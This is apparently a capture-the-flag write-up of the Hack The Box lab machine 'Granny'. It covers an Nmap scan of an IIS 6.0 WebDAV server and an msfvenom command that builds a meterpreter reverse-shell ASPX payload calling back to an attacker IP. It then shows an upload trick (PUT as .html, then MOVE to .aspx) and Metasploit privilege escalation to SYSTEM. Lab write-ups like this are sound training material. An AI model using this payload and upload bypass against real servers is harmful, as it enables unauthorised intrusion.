---
title:     "Hack The Box - Granny"
tags: [windows,easy,isi,put]
---

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-granny/1.png)

We are going to pwn Granny from Hack The Box.

Link : <https://www.hackthebox.eu/home/machines/profile/14>


Lets Begin with our Initial Nmap Scan.

## Nmap Scan Results:

```
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
| http-ntlm-info: 
|   Target_Name: GRANNY
|   NetBIOS_Domain_Name: GRANNY
|   NetBIOS_Computer_Name: GRANNY
|   DNS_Domain_Name: granny
|   DNS_Computer_Name: granny
|_  Product_Version: 5.2.3790
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Date: Sat, 07 Mar 2020 04:33:20 GMT
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/6.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  WebDAV type: Unknown
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4
Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows Server 2008 Enterprise SP2 (90%), Microsoft Windows Server 2003 SP2 (90%), Microsoft Windows XP SP3 (90%), Microsoft Windows 2003 SP2 (89%), Microsoft Windows XP (87%), Microsoft Windows Server 2003 SP1 - SP2 (86%), Microsoft Windows 2000 SP4 (85%), Microsoft Windows XP SP2 or Windows Server 2003 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## HTTP:

The webpage is running as ``ISI 6.0`` from Nmap results. Like [Grandpa](https://0xw0lf.github.io//posts/HTB-Grandpa).<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-granny/2.png)

The Nmap ``webdav-scan`` revealed that we have ``PUT`` options. I tried ``davtest``.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-granny/3.png)

I opened one of the ``PUT`` link to see whats going.I captured the burp request.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-granny/4.png)
We need to know the file extension to upload to get reverse shell.And it is Powered by ``ASP.NET`` so our payload must be in ``.asp or .aspx``.

Now we need create a payload and ``PUT`` to the website.
I used ``msfvenom`` for creating payload

>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.22 LPORT=1234 -f aspx

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-granny/5.png)

We I tried uploading the payload but I got ``403 Forbidden``.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-granny/6.png)

We know the website have lot of ``Allowed Methods`` so I checked what ``MOVE`` will do?
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-granny/7.png)

Since ``.aspx`` is not allowed to upload we can upload someother file and change the extension back to ``.aspx``.

I used ``.html`` to upload the same payload, now we can use ``Move`` to change its extension.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-granny/8.png)

``201 Created`` It worked, Extension changed.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-granny/9.png)

Started my Listener in ``Msfconsole`` <br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-granny/10.png)

## Privilege Escalation:

We can try try ``local_exploit_suggester`` before that, need to ``migrate`` process inorder to make it stable. So I won't face any errors while using any exploit.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-granny/11.png)

Let's background this session and Use ``local_exploit_suggester``
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-granny/13.png)

So it's like [Grandpa](https://0xw0lf.github.io//posts/HTB-Grandpa) Box, same exploits.
I used the same ``windows/local/ppr_flatten_rec``
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-granny/14.png)

Got NT AUTHORITY\SYSTEM



